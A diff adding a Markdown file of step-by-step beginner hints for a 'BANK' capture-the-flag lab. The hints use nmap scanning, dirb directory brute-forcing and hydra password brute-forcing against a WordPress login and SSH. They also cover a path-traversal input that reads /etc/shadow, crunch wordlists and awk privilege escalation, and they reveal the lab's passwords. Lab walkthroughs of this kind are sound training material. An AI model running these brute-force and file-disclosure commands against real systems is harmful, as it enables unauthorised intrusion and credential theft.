@@ -1,0 +1,117 @@
+# BANK CTF Hints for beginners 
+
+## _By Jacvbtaylor_
+
+
+**HINT 1** 
+Run an nmap scan on your network to find the Bank’s IP. Run ifconfig to find your ip range. Note: NMAP may take a while to finish
+
+**HINT 2**  
+Run this command and replace “ip” with the ip range on your network:
+``nmap -sn -v ip/24   ``
+example- if my ifconfig scan outputs my ip as 10.0.0.12 then I will run nmap -sn -v 10.0.0.0/24 
+You can run this whole command to ONLY output the hosts that are up and put those IP’s into a text file. The script will then use that text file to do an extensive scan on those IP’s it found to be up to find what services/ports are running and open. 
+``nmap -sn -v 10.0.0.0/24 -oG - | awk '/Up$/{print $2}' >> nmap.txt && nmap -v -iL nmap.txt``
+
+**HINT 3** 
+visit the target IP in your browser . Make sure your URL doesn’t change to https
+
+
+**HINT 4**
+view the source code of the page
+
+**HINT 5**
+Did you notice the page the button goes to? Maybe we can get to it manually
+
+**HINT 6**
+find list and run ``wget http://<ip>/robots.txt`` just make sure to replace the IP with the one you discovered
+
+
+**HINT 7**
+run command as ``dirb http://<ip>/`` and keep an eye out for ⇒ flags. This means it
+found a valid webpage/directory 
+
+**HINT 8** 
+You should have found a wordpress directory from your dirb attack. Visit that page and find the first flag. Keep track of special information, like names so you can social engineer. 
+
+
+**HINT 9**
+Do you think patrick has an account on the wordpress site? 
+
+**HINT 10**
+Remember that list you found earlier? Let’s use it 
+
+**HINT 11** 
+Here is the syntax you should use for your bruteforce attack. Be sure to replace the IP address with your target’s IP.
+``hydra -l patrick -P robots.txt 10.0.0.181 http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:ERROR' -vV -t 30``
+
+**HINT 12** 
+Patrick can’t do too much to the site. Find another account with more privileges. 
+
+**HINT 13** 
+Reference flag one for a clue to who the admin may be
+
+**HINT 14**
+``hydra -l manager -P robots.txt 10.0.0.181 http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:ERROR' -vV -t 30``
+
+
+**HINT15** 
+take your ASCII code and decipher it 
+
+**HINT 16**
+decode it here https://www.duplichecker.com/ascii-to-text.php
+
+
+**HINT 17**
+Save your decoded list as list.txt 
+
+**HINT 18** 
+you should have found port 22 or SSH open
+
+**HINT 19**
+try this command ``hydra -L list.txt -P list.txt ssh://10.0.0.181 -v -F -t 15``
+
+**HINT 20** 
+run ``ssh user@<ip> <port>``
+
+**HINT 21** 
+you should have found a user and password with the same name
+
+**HINT 22** 
+user/pass is cat 
+
+**HINT 23** 
+start with field 3. See if you can get the script to show something it’s not supposed to.
+
+**HINT 24** 
+try running ``6 AM ../../../../ Roulette`` What are the errors telling you?
+
+**HINT 25** 
+This looks like a Local File Inclusion exploit. What else can you see that you shouldn’t be able to? 
+
+**HINT 26** 
+you can change any field except field 4. Try looking at the /etc/shadow file using the script 
+
+**HINT 27** 
+look at the format of a shadow file and look for 2 characters all of the lines have using this URL https://www.cyberciti.biz/faq/understanding-etcshadow-file/ 
+
+
+**HINT 28** 
+try this ``x : /etc/shadow BlackJack``
+
+**HINT 29** 
+look for root’s message to Cat
+
+**HINT 30** 
+Try using crunch real quick. Run ``crunch 1 2 be`` to help you understand how it works. You can add different numbers and letters but be careful! Big numbers will make a huge list. 
+
+**HINT 31**
+You can google the riddle for the answer. It should be an 8 letter word. 
+
+**HINT 32** 
+``crunch 1 6 prisoner``
+
+**HINT 33** 
+password is 137256 
+BUT maybe try a privilege escalation instead 
+https://www.hacknos.com/awk-privilege-escalation/
